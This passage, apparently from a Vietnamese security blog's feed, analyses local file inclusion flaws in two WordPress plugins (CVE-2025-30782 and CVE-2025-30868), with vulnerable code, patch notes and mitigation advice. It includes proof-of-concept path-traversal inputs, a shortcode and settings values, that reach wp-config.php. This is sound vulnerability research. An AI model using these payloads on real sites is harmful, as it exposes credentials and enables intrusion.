WordPress plugin c·ªßa t√¥i, &lt;code&gt;$atts&lt;/code&gt; th∆∞·ªùng l√† c√°c attribute c·ªßa shortcode, v√≠ d·ª•:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[pornhub id=69]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C√≥ th·ªÉ th·∫•y r·∫±ng file &lt;code&gt;form-template.php&lt;/code&gt; &lt;strong&gt;lu√¥n ƒë∆∞·ª£c include&lt;/strong&gt; trong kh·ªëi &lt;code&gt;if-else&lt;/code&gt; n·∫±m b√™n trong ph·∫ßn &lt;code&gt;else&lt;/code&gt;, &lt;strong&gt;khi cookie &lt;code&gt;stdl_encryption_key&lt;/code&gt; kh√¥ng t·ªìn t·∫°i&lt;/strong&gt; (t·ª©c l√† ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng k√Ω ho·∫∑c ch∆∞a c√≥ kh√≥a m√£ h√≥a h·ª£p l·ªá).&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;stdl-shortcode.php&lt;/code&gt; ƒë∆∞·ª£c &lt;code&gt;include&lt;/code&gt; trong callback c·ªßa shortcode &lt;code&gt;subscribe_to_download_form&lt;/code&gt; v·ªõi &lt;code&gt;atts&lt;/code&gt; l√† m·∫£ng c√°c attribute c·ªßa shortcode.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function __construct() {&#xA;    add_shortcode(&amp;#39;subscribe_to_download_form&amp;#39;, array($this, &amp;#39;generate_shortcode_output&amp;#39;));&#xA;}&#xA;&#xA;function generate_shortcode_output($atts) {&#xA;    wp_enqueue_style(&amp;#39;stdl-frontend-custom&amp;#39;, STDL_CSS_DIR . &amp;#39;/stdl-custom.css&amp;#39;, array(), STDL_VERSION);&#xA;    ob_start();&#xA;    include(STDL_PATH . &amp;#39;inc/views/frontend/stdl-shortcode.php&amp;#39;);&#xA;    $form_html = ob_get_contents();&#xA;    ob_clean();&#xA;    return $form_html;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-1&#34;&gt;&lt;span&gt;Step 1&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;ƒêƒÉng nh·∫≠p v√†o WordPress b·∫±ng t√†i kho·∫£n Contributor c√≥ ƒë·∫∑c quy·ªÅn th·∫•p nh·∫•t ƒë·ªÉ t·∫°o post.&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-2&#34;&gt;&lt;span&gt;Step 2&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;T·∫°o post v·ªõi shortcode&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[subscribe_to_download_form template=&amp;#39;../../../../../../../wp-config&amp;#39;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Debugger ƒë√£ nh·∫£y ƒë·∫øn &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-16-cve-2025-30782/result.png&#34;&#xA;    alt=&#34;K·∫øt qu·∫£ LFI th√†nh c√¥ng&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;K·∫øt qu·∫£ LFI th√†nh c√¥ng&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Phi√™n b·∫£n &lt;strong&gt;‚â§ 1.2.9&lt;/strong&gt; c·ªßa Subscribe to Download Lite cho ph√©p LFI v√¨ &lt;code&gt;include()&lt;/code&gt; d√πng &lt;code&gt;$atts[&#39;template&#39;]&lt;/code&gt; ch∆∞a ƒë∆∞·ª£c x√°c th·ª±c; l·ªó h·ªïng ƒë√£ ƒë∆∞·ª£c v√° trong &lt;strong&gt;1.3.0&lt;/strong&gt; b·∫±ng &lt;code&gt;basename()&lt;/code&gt; + &lt;code&gt;realpath()&lt;/code&gt; v√† ki·ªÉm tra &lt;code&gt;base_dir&lt;/code&gt;. C·∫≠p nh·∫≠t ngay.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Input t·ª´ shortcode kh√¥ng ƒë∆∞·ª£c tin c·∫≠y ‚Äî kh√¥ng include tr·ª±c ti·∫øp.&lt;/li&gt;&#xA;&lt;li&gt;Patch (v1.3.0) d√πng &lt;code&gt;basename()&lt;/code&gt; + &lt;code&gt;realpath()&lt;/code&gt; + so s√°nh v·ªõi th∆∞ m·ª•c cho ph√©p.&lt;/li&gt;&#xA;&lt;li&gt;H√†nh ƒë·ªông: c·∫≠p nh·∫≠t plugin, whitelist/validate attributes.&lt;/li&gt;&#xA;&lt;li&gt;Gi√°m s√°t logs cho k√Ω t·ª± &lt;code&gt;../&lt;/code&gt; trong tham s·ªë template.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/subscribe-to-download-lite/vulnerability/wordpress-subscribe-to-download-lite-plugin-1-2-9-local-file-inclusion-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Subscribe to Download Lite Plugin &amp;lt;= 1.2.9 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-30868 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-15-cve-2025-30868/</link>
      <pubDate>Wed, 15 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-15-cve-2025-30868/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-15-cve-2025-30868/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Team Manager&lt;/strong&gt; phi√™n b·∫£n &lt;strong&gt;‚â§ 2.1.23&lt;/strong&gt; ch·ª©a l·ªó h·ªïng &lt;strong&gt;Local File Inclusion&lt;/strong&gt; cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh &lt;code&gt;include/require&lt;/code&gt;, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-30868&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-30868&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.1.23&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.2.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (7.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-team-manager/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Team Manager Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Team Manager&lt;/strong&gt;: &lt;strong&gt;2.1.23&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;2.2.0&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://wordpress.org/plugins/elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Elementor plugin&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;B·∫£n l·ªói&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function renderElementorLayout(string $layout, array $data, array $settings): void&#xA;{&#xA;    $styleTypeKey = &amp;#34;{$layout}_style_type&amp;#34;;&#xA;    $styleType = stripslashes($settings[$styleTypeKey]);&#xA;    $path = stripslashes(TM_PATH . &amp;#39;/public/templates/elementor/layouts/&amp;#39; . $layout . &amp;#39;/&amp;#39;);&#xA;    $templateName = sanitize_file_name( $styleType . &amp;#39;.php&amp;#39; );&#xA;    //allowed file type&#xA;    $allowedFileTypes = [&#xA;        &amp;#39;php&amp;#39;&#xA;    ];&#xA;    $ext = pathinfo($path . $templateName, PATHINFO_EXTENSION);&#xA;    if (in_array($ext, $allowedFileTypes)) {&#xA;        if (file_exists($path . $templateName)) {&#xA;            include self::locateTemplate($templateName, &amp;#39;&amp;#39;, $path);&#xA;        }&#xA;    }&#xA;&#xA;}&#xA;&#xA;private static function locateTemplate(string $templateName, string $templatePath = &amp;#39;&amp;#39;, string $defaultPath = &amp;#39;&amp;#39;): string&#xA;{&#xA;    $templatePath = $templatePath ?: &amp;#39;public/templates&amp;#39;;&#xA;    $defaultPath = $defaultPath ?: TM_PATH . &amp;#39;/public/templates/&amp;#39;;&#xA;    $template = locate_template(trailingslashit($templatePath) . $templateName);&#xA;    return $template ?: &amp;#34;{$defaultPath}{$templateName}&amp;#34;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n l·ªói, h√†m &lt;code&gt;renderElementorLayout()&lt;/code&gt; kh√¥ng x√°c th·ª±c gi√° tr·ªã ƒë·∫ßu v√†o. &lt;strong&gt;attacker&lt;/strong&gt; c√≥ th·ªÉ v∆∞·ª£t qua logic tr√™n khi ki·ªÉm so√°t ƒë∆∞·ª£c &lt;code&gt;$layout&lt;/code&gt; v√† &lt;code&gt;$settings&lt;/code&gt;, v√≠ d·ª•:&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Trong h√†m &lt;code&gt;renderElementorLayout()&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$layout = &amp;quot;../../../../../../..&amp;quot;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$settings[&#39;../../../../../../.._style_type&#39;] = &amp;quot;wp-config&amp;quot;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Khi ƒë√≥:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$styleType = &#39;wp-config&#39;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$path = TM_PATH . &#39;/public/templates/elementor/layouts/../../../../../../../&#39;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$templateName=wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$path . $templateName = TM_PATH . &#39;/public/templates/elementor/layouts/../../../../../../../wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-15-cve-2025-30868/debug1.png&#34;&#xA;    alt=&#34;Debugger gi√° tr·ªã c·ªßa c√°c bi·∫øn&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debugger gi√° tr·ªã c·ªßa c√°c bi·∫øn&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Sau khi v∆∞·ª£t qua c√°c m·ªánh ƒë·ªÅ &lt;code&gt;if&lt;/code&gt; th√¨ &lt;code&gt;include&lt;/code&gt; gi√° tr·ªã tr·∫£ v·ªÅ c·ªßa &lt;code&gt;locateTemplate(wp-config.php, &#39;&#39;, TM_PATH . &#39;/public/templates/elementor/layouts/../../../../../../../&#39;)&lt;/code&gt; :&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private static function locateTemplate(string $templateName, string $templatePath = &amp;#39;&amp;#39;, string $defaultPath = &amp;#39;&amp;#39;): string&#xA;{&#xA;    $templatePath = $templatePath ?: &amp;#39;public/templates&amp;#39;;&#xA;    $defaultPath = $defaultPath ?: TM_PATH . &amp;#39;/public/templates/&amp;#39;;&#xA;    $template = locate_template(trailingslashit($templatePath) . $templateName);&#xA;    return $template ?: &amp;#34;{$defaultPath}{$templateName}&amp;#34;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi 